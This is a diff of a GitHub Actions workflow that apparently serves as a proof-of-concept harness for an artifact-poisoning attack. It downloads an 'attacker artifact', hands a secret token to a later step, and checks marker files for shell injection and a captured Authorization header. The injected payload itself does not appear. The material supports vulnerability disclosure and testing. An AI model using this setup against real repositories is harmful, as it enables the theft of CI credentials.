@@ -21,35 +21,12 @@ jobs:
         id: get-pr
         uses: actions/github-script@v7
         with:
-          retries: 3
           script: |
             const wfRun = context.payload.workflow_run;
             const pr = wfRun.pull_requests[0];
-            let number, base_sha, head_sha;
-            if (pr) {
-              number = pr.number;
-              base_sha = pr.base.sha;
-              head_sha = pr.head.sha;
-            } else {
-              const headLabel = `${wfRun.head_repository.owner.login}:${wfRun.head_branch}`;
-              const { data: prs } = await github.rest.pulls.list({
-                owner: context.repo.owner,
-                repo: context.repo.repo,
-                state: 'open',
-                head: headLabel,
-              });
-              const matched = prs[0];
-              if (!matched) throw new Error(`No open PR found for head ${headLabel}`);
-              number = matched.number;
-              base_sha = matched.base.sha;
-              head_sha = wfRun.head_sha;
-            }
-            core.info(`is_fork:  ${pr ? 'false' : 'true'}`);
-            core.info(`number:   ${number}`);
-            core.setOutput('is_fork', pr ? 'false' : 'true');
-            core.setOutput('number', number);
-            core.setOutput('base_sha', base_sha);
-            core.setOutput('head_sha', head_sha)
+            core.info(`is_fork: ${pr ? 'false' : 'true'}`);
+            core.info(`head_repo: ${wfRun.head_repository.full_name}`);
+            core.setOutput('number', pr ? pr.number : 0)
 
       - name: Download attacker artifact (stands in for gradle download-and-submit)
         uses: actions/download-artifact@v4
@@ -75,19 +52,17 @@ jobs:
           ${{ steps.dependency-review.outputs.comment-content }}
           EOF
 
-      - name: Next node action (inherits GITHUB_ENV from injected step)
+      - name: Next action holding the PAT (mirrors sticky-pull-request-comment)
         uses: actions/github-script@v7
         with:
+          github-token: ${{ secrets.POC_TOKEN }}
           script: |
-            core.info('subsequent node action executed')
+            try { await github.rest.repos.get({owner: context.repo.owner, repo: context.repo.repo}) } catch (e) { core.warning(String(e)) }
 
       - name: Verify markers
         if: always()
         run: |
-          echo "--- openssf-report.html head ---"
-          head -c 300 openssf-report.html || true
-          echo
           echo "--- shell injection marker ---"
           cat /tmp/gab_rce_marker 2>/dev/null || echo MISSING
-          echo "--- NODE_OPTIONS marker ---"
-          cat /tmp/gab_node_marker 2>/dev/null || echo MISSING
+          echo "--- captured Authorization header ---"
+          cat /tmp/gab_token_capture 2>/dev/null || echo MISSING
